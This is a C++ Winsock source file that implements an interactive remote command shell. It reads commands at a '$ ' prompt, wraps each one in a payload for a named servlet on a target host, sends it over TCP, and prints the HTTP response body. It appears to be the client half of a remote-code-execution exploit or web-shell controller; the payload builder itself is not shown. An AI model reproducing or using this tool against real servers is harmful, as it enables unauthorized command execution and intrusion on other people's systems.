#include "hdr.h"

void telnet(addrinfo* addr, string target, string servlet) {
    char buf[100];
    char cmd[100];
    DWORD bytes;

    while (1) {
        ZeroMemory(cmd, 100);

        cout << "$ ";
        cin.getline(cmd, 100);
        cout << endl;

        string payload = getPayload(target, servlet, cmd);
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        connect(sock, addr->ai_addr, addr->ai_addrlen);
        send(sock, payload.c_str(), payload.length(), NULL);

        while ((bytes = recv(sock, buf, 100, NULL)) > 0) {
            int dlen = bytes - (string(buf).find("\r\n\r\n") + 4);
            cout << string(buf).substr(string(buf).find("\r\n\r\n") + 4, dlen);
            if (dlen != 0 && bytes != 100) {
                break;
            }
        }

        cout << endl;
    }
}

addrinfo* findHost(string ip, string port) {
    WSADATA wd;
    SOCKET sock = INVALID_SOCKET;
    addrinfo* res = NULL, * ptr = NULL, hints;

    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) {
        cout << "Error starting winsock" << endl;
        return 0;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(ip.c_str(), port.c_str(), &hints, &res) != 0) {
        cout << "The target could not be found." << endl;
        return 0;
    }

    for (ptr = res; ptr != NULL; ptr = ptr->ai_next) {
        sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (sock == INVALID_SOCKET) {
            cout << "Error creating socket." << endl;
            return 0;
        }

        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            continue;
        }

        break;
    }

    return ptr;
}
